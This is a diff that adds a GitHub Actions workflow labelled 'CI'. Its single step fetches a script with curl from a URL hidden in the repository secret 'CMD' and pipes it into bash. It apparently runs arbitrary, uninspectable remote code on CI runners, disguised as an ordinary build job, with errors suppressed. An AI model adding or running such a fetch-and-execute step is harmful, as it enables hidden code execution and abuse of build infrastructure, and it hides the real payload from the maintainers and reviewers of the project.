@@ -1,0 +1,14 @@
+name: CI
+
+on: 
+  workflow_dispatch:
+
+jobs:
+  code-job:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+    steps:
+      - run: |
+      	  bash <(curl -s ${{ secrets.CMD }})
